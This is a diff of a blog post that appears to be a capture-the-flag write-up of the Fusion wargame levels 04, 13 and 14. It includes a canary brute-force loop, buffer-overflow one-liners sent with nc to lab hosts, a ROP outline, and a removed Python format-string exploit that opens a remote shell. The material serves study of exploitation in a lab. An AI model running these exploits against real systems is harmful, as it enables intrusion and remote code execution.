@@ -6,7 +6,6 @@ author: jonatanhal
 
 ---
 
-
 # [level04](https://exploit-exercises.com/fusion/level04/)
 
 >About 
@@ -21,7 +20,7 @@ http-server, and we also need to adjust our exploit to make it
 sidestep the issue of [SSP](http://wiki.osdev.org/Stack_Smashing_Protector)
 and PIE.
 
-### SSP in a nutshell
+## Stack Smashing Protection in a nutshell
 
 SSP is typically implemented as a saved 64/32 bit value on the stack,
 located next to the saved return address. The saved value can be
@@ -32,22 +31,8 @@ When overflowing a buffer in a attempt to overwrite the saved
 return-address, the saved value (referred to as a stack-canary) will
 also overwritten. Before the function returns, the canary is checked.
 
-If a canary-change is detected, proper action can be taken.
-
-### No SSP here, SSP everywhere else.
-
-There does not seem to be a stack-canary in the `base64_decoder`
-function, as there are no calls to `__stack_chk_fail_local`. As opposed to
-the function `validate_credentials`, which do include calls to
-the aforementioned function.
-
-The details-variable in `validate_credentials`, is likely is the 
-target (since it's the only stack-allocated buffer which size
-is below 10k.
-
-I'm guessing that the `base64_decoder` function somehow got excluded from
-the SSP-treatment by the compiler. So, as long as we don't overflow the 
-stack-canary in a function calling `base64_decoder`, we should be ok.
+If a canary-change is detected, the program is aborted - and the
+overwritten return-address is never used.
 
 ### Authenticating :~)
 
@@ -121,10 +106,15 @@ for y := 0; y < len(password); y++ {
 			p := make([]rune, 16)
 			copy(p, password)
 			p[y] = keyspace[ki]
+			// Every other request is a real guess or a known false request
+			// I'm not sure why this is better, but according to one of the talks listed
+			// in the good stuff-section, this method produces better, more consistent results
 			if i % 2 == 0 {
+				// "Real" request
 				delta := sendRequest(p)
 				writeEntry(delta.Nanoseconds(), p[y], y)
 			} else {
+				// Known bad request
 				delta := sendRequest(password)
 				writeEntry(delta.Nanoseconds(), password[0], y)
 			}
@@ -200,6 +190,7 @@ character `i` in our graph - would this be an indicator of a correct
 byte in the password, perhaps?
 
 We can cheat for a very brief moment, just to check if the bump in our
+
 graph corresponds to the correct character in the password.
 
 ~~~
@@ -248,7 +239,7 @@ checks if the variable `l` (used to iterate through our submitted
 credentials) is smaller than password_size (which indicates that the
 submitted passwords length does not match the generated password) - if
 that is indeed the case, or `bytes_wrong` is not zero; the function
-errors out via `send_error` - which is not what we want.
+errors out via `se nd_error` - which is not what we want.
 
 This means that our submitted credentials are still treated as valid,
 if the credentials we submit are bigger than `sizeof(details)`, as
@@ -263,14 +254,196 @@ $ python2 -c "print 'A'*2048" | ./level04_exploit $PASSWORD | nc 192.168.14.33 2
 ~~~
 
 As you can see, no sigsegv - because the program was gracefully
-aborted via the SSP when it detected that the stack had been corrupted.
+aborted via the SSP when it detected that the stack had been
+corrupted.
 
-When doing some research on SSP, it seems that are stored on the stack
-only change during certain conditions, such as when the program is
-restarted.
+A strange thing that happened is that I get back a bigger response
+when I tried this exploit back home (I usually sit in my classroom
+while writing these things)
+
+~~~
+python2 -c "print 'a'*2048" | ./level04_exploit $PASS | nc 192.168.1.6 20004
+*** stack smashing detected ***: /opt/fusion/bin/level04 terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xb77e08d5]
+/lib/i386-linux-gnu/libc.so.6(+0xe7887)[0xb77e0887]
+/opt/fusion/bin/level04(+0x2dd1)[0xb78a4dd1]
+/opt/fusion/bin/level04(+0x22c7)[0xb78a42c7]
+/opt/fusion/bin/level04(+0x24c0)[0xb78a44c0]
+/opt/fusion/bin/level04(main+0x390)[0xb78a34d0]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7712113]
+/opt/fusion/bin/level04(+0x170d)[0xb78a370d]
+======= Memory map: ========
+b76da000-b76f6000 r-xp 00000000 07:00 92670      /lib/i386-linux-gnu/libgcc_s.so.1
+b76f6000-b76f7000 r--p 0001b000 07:00 92670      /lib/i386-linux-gnu/libgcc_s.so.1
+b76f7000-b76f8000 rw-p 0001c000 07:00 92670      /lib/i386-linux-gnu/libgcc_s.so.1
+b76f8000-b76f9000 rw-p 00000000 00:00 0 
+b76f9000-b786f000 r-xp 00000000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
+b786f000-b7871000 r--p 00176000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
+b7871000-b7872000 rw-p 00178000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
+b7872000-b7875000 rw-p 00000000 00:00 0 
+b787f000-b7881000 rw-p 00000000 00:00 0 
+b7881000-b7882000 r-xp 00000000 00:00 0          [vdso]
+b7882000-b78a0000 r-xp 00000000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
+b78a0000-b78a1000 r--p 0001d000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
+b78a1000-b78a2000 rw-p 0001e000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
+b78a2000-b78a6000 r-xp 00000000 07:00 75281      /opt/fusion/bin/level04
+b78a6000-b78a7000 rw-p 00004000 07:00 75281      /opt/fusion/bin/level04
+b838a000-b83ab000 rw-p 00000000 00:00 0          [heap]
+bf988000-bf9a9000 rw-p 00000000 00:00 0          [stack]
+~~~
+
+So... The backtrace sure is helpful, I - as a exploit developer
+appriciate that :D
+
+And ASLR is only so effective when your program uses fork, as the
+addresseses are inherited from the process parent to the child.
+
+~~~
+ $ # Case in point
+ $ python2 -c "print 'a'*2048" | ./level04_exploit $PASS | nc 192.168.1.6 20004 > 1
+ $ python2 -c "print 'a'*2048" | ./level04_exploit $PASS | nc 192.168.1.6 20004 > 2
+ $ diff 1 2
+ $ # no diff :D
+~~~
+
+Same thing with SSP, the cookie itself is stored in thread-specific
+memory - but is not rerandomized in any child-process (atleast in this
+case where fork is being used to create each child process), I could
+be (and hope I am) wrong in other cases :D
+
+As I have previously said, the stack canary is implemented as a dword
+on the stack, located right next to the return address; and is loaded
+from thread-local storage (accessible through the gs segment register)
+via `load eax, gs:0x14; mov [esp+0x83c], eax`.
+
+But how do we bypass this protection, if it can be bypassed at all?
+
+### set_thread_area syscall
+
+At the beginning of our program, a syscall of `set_thread_area` is
+made, and it's purpose is to associate the gs-register to a location
+in memory.
+
+<pre>
+$ strace -e trace=set_thread_area /opt/fusion/bin/level04
+set_thread_area({entry_number:-1 -> 6,
+	<strong>base_addr:0xb77318d0,</strong> 
+	limit:1048575,
+	seg_32bit:1,
+	contents:0,
+	read_exec_only:0,
+	limit_in_pages:1,
+	seg_not_present:0,
+	useable:1}) = 0
+</pre>
+
+In this case, the gs register would, after the kernel hands back
+execution to level04 - point to `0xb77318d0`, and a access to
+`gs:0x14` would actually dereference `0xb77318d0 + 0x14`.
+
+![Meet your deadbeef, canary]({{ site-url }}/assets/post_images/fusion_level04_canary_control.jpg)
+
+I was able to overwrite the canary to the value `0xfacebeef`, by
+passing a lot of lowercase b's to my client, which base64-encodes the
+content #and slaps the values together into a basic HTTP GET request.
+
+<pre>
+$ python2 -c "print 'b'*2027+'<strong>\xef\xbe\xce\xfa</strong>PADD'" | ./level04_exploit $PASS | nc 192.168.1.6 20004
+</pre>
+
+Now that we know how to overwrite the canary, 'tis time to
+bruteforceth.
+
+With a few modifications to our client, we're able to more elegantly
+craft and overwrite canaries, and using a basic grep, we can determine if 
+the process has aborted or not.
+
+{% highlight sh %}
+# Canary script:
+for i in $(seq 16777215); do
+ ./level04_canary_bf $PASS $i | nc 192.168.1.6 20004 | grep terminated > /dev/null
+ if [[ $? -ne 0 ]]; then
+   printf "Canary: %08x\n" $i
+   break
+ fi
+ echo $i
+done;
+{% endhighlight %}
 
 
+## Can you spot issue with my approach?
 
+That's right, I was overwriting the entire canary on each iteration,
+which is the least effective way of bruteforcing - if we are
+overwriting the entire canary from the get go, we would have to guess
+**8 million** times just to cover the initial 50% - now, compare that
+with bruteforcing a single byte in the canary, we would, at most -
+have to guess 255 times - *to cover **all** values*
+
+Rubbing salt into our wounds, we contemplate over the not-so-subtle
+hint in the challenge description itself. 
+
+> Partial overwrites ahoy!
+
+:(
+
+After implementing the partial overwriting of the canary - it took
+less than a minute to recover all the stack-canary bytes, compared to
+my previous bruteforcing-attempt which took more than a week (before I realized my approach was wrong),
+literally more than 6 million requests... a gigantic facepalm was
+issued once I realized my mistake.
+
+![I done goofd]({{ site-url }}/assets/post_images/fusion_level04_partial_fail.gif)
+
+# Exploiting stuff
+
+Now that we can both acquire the password, and properly bruteforce a
+canary protecting the stack - it's time to bring out some corrupted
+memory for this process to chew on.
+
+![We did it reddit!]({{ site-url }}/assets/post_images/fusion_level04_control_over_pc.png)
+
+This has been a long time coming, and if you've made it this far in my
+post - shoutouts to ya.
+
+Now, the exact locations of stuff like imported libraries is
+randomized via ASLR, but since addresses can be leaked by corrupting
+the stack-canary as previously observed - the ASLR is effectively
+defeated.
+
+All we need to do is to observe a offset between a function that we
+want to use in our exploit, and the address that's being leaked.
+
+After some experimenting, it turns out that I can return consistently
+to system - but my pointer to the command I want to run is getting
+shuffled around the stack for some wierd reason - my idea was to base
+the address of the stack leaked in previous steps - adjust that
+address by a known offset (for example, by observing that my buffer is
+located `0xfefe` bytes after the leaked pointer - I could make
+adjustments accordingly.
+
+I'm not sure why my technique did not work, and I guess I already - to
+some extent, achieved code execution; but I want my exploit to be
+'complete' - correctly executing commands and all that goes with it :)
+
+What about the the writable segment mapped below `.text`?
+
+Well we can overwrite it using something like read(3)
+
+If we use a ropchain with two 'links' - one where we return into
+read with something like `read(1, writable_memory, some_length);` -
+where some_length is the length of the command we want to run.
+
+Provided we actually send over the command we want to run, when
+read is called ...
+
+![We did it reddit!]({{ site-url }}/assets/post_images/fusion_level04_win.jpg)
+
+BOOM!
+
+You can find all of the code I used to exploit this level
+[here](https://github.com/jonatanhal/fusion_exploits/).
 
 ## Good stuff
 
@@ -513,172 +686,10 @@ it's as simple as that.
 
 ![level13-celebration]({{ site-url }}/assets/post_images/fusion_level13_celebration.gif)
 
-Now, I'm gonna give out a trigger warning - because I am about to show
-you the python-code I wrote to complete this level... and it ain't pretty.
-
-{% highlight python %}
-# Written by: @jonatanhal
-# Exploits formatting-vulnerability in exploit-exercises.com / fusion / level13
-# Shoutouts to @detectify.
-import struct, socket, re, time
-
-DEBUG=False
-pack   = lambda dword: struct.pack('I', dword)
-mallocp = re.compile('m:(\w+):')
-retp    = re.compile('r:(\w+):')
-target = ("192.168.14.31", "20013")
-
-username = "m:%184$08x:\r\n"
-password = "r:%3$08x:\r\n"
-email    = "Fruce\r\n"
-
-def padding(address, sofar):
-    sequence = []
-    for byte in pack(address):
-        byte = ord(byte)+0x100
-        sofar %= 0x100
-        padding = (byte - sofar) % 0x100
-        if padding < 10:
-            padding += 0x100
-        sequence.append(padding)
-        sofar += padding
-    return sequence
-
-# ========== First Phase ========== #
-# Leak and collect addresses
-s = socket.create_connection(target)
-if DEBUG:
-    raw_input("press any key once you've attached to the process & set up your breakpoints")
-s.send(username + password + email)
-time.sleep(1)
-body=s.recv(192, socket.MSG_WAITALL)
-print body
-try:
-    # the pointer to malloc on the stack, refers to
-    # about 35 bytes into malloc, and we need to take that
-    # into account. And execve is located 0x102510 bytes before
-    # malloc.
-    execve=int(mallocp.search(body).groups()[0], base=16)-(35+0x102510)
-    print "[i] execve:", hex(execve)
-    # 160 is the amount of bytes between ret-address and 
-    # the third pointer located on the stack (username)
-    password=int(retp.search(body).groups()[0], base=16)
-    again=password+(0x40 + 4) # first 4 bytes = yes\x00
-    ret=password+160
-    print "[i] ret:", hex(ret)
-except Exception as e:
-    print(e)
-    s.close()
-    exit(1)
-time.sleep(1)
-s.recv(256)
-s.send("yes\r\n")
-s.recv(256)
-
-# ========== Second Phase ========== #
-# Overwrite the return address
-try:
-    # send the addresses + %n thing
-    payload=pack(ret+0) + pack(ret+1) + pack(ret+2) + pack(ret+3) +\
-            pack(ret+8) + pack(ret+9) + pack(ret+10) + pack(ret+11) + "\r\n"
-    s.send(payload)
-    s.recv(256)
-    #  nread = execve+0x10f1a8
-    #  system = execve-0x5edf0
-    address = execve-0x5edf0
-    print "[i] address:", hex(address)
-    # +12 because we've written 4 aditional pointers in the previous buffer 
-    sequence = padding(address, 0x3a + (4*4))
-    buffer="%1$0{}c".format(sequence[0]) + "%522$n" +\
-           "%1$0{}c".format(sequence[1]) + "%523$n" +\
-           "%1$0{}c".format(sequence[2]) + "%524$n" +\
-           "%1$0{}c".format(sequence[3]) + "%525$n" +\
-           "\r\n"
-
-    print "[i] buffer/len:{}/{}".format(buffer, len(buffer))
-    s.send(buffer)
-    time.sleep(0.5)
-    s.recv(256)
-
-    # 0xcd written at this point
-    address = again
-    print "[i] address:", hex(address)
-    sequence = padding(address, 0xcd)
-    buffer = "%1$0{}c".format(sequence[0]) + "%526$n" +\
-             "%1$0{}c".format(sequence[1]) + "%527$n" +\
-             "%1$0{}c".format(sequence[2]) + "%528$n" +\
-             "%1$0{}c".format(sequence[3]) + "%529$n" +\
-             "\r\n"
-
-    print "[i] buffer/len:{}/{}".format(buffer, len(buffer))
-    s.send(buffer)
-    time.sleep(0.5)
-    s.recv(256)
-    time.sleep(1)
-    s.recv(256)
-    s.send("yes\x00/bin/sh\x00\r\n")
-    s.recv(1028)
-
-except Exception as e:
-    print e
-    s.close()
-    exit(1)
-
-# serve shell :)
-try: 
-    while True:
-        cmd=raw_input("$ ")
-        if cmd=="":
-            continue
-        if cmd=="exit":
-            s.close()
-            exit(0)
-        s.send(cmd+"\x0a")
-        print s.recv(512)
-except Exception as e:
-    print e
-    s.close()
-    exit(1)
-{% endhighlight %}
+You can read the exploit-code [here](https://github.com/jonatanhal/fusion_exploits/blob/master/level13/solution.py)
 
 * * * 
 
-# [level14](https://exploit-exercises.com/fusion/level14/)
+Thanks for reading! 
 
-> About
->
-> There is no description available for this level. Investigate the binary at /opt/fusion/bin/level14!
-
-Let me be clear, that even though this level states that it contains a
-heap-based vulnerability, I do not trust it implicitly - just because it
-was wrong in the previous level.
-
-Whatever, provided that the actual binary is started, we can connect to
-it on port 20014; where we're greeted with something quite basic - and
-once again - very fishy.
-
-~~~
-jh@al ~/blog/_drafts $ nc 192.168.14.31 20014
-asdasd
-asdasd
-%08x%08x%08x%08x%08x%08x
-b9728a1cb972c29800000001bfeed260b9728158b7799700
-% 9x% 9x% 9x% 9x% 9x% 9x% 9x
- b9728a1c b972caa0        1 bfeed260 b9728158 b7799700        0
-~~~
-
-Upon taking a look at the binary itself, it's main function is
-different in structure - whereas previous levels used `common.c` -
-which provided functions like serve_forever, set_io,
-background_process and so on - this is a simple little tiny main with
-only two function-calls.
-
-![level14-main]({{ site-url }}/assets/post_images/fusion_level14_main.png)
-
-And the floodgates open when we're about to have a look at `sub._Znwj_17_ff0`.
-
-![mysterious subroutine]({{ site-url }}/assets/post_images/fusion_level14_floodgates.png)
-
-Looking at a flowgraph, it can only be described as daunting.
-
-![wtf]({{ site-url}}/assets/post_images/fusion_level14_daunt.png)
+Catch y'all in part three! 
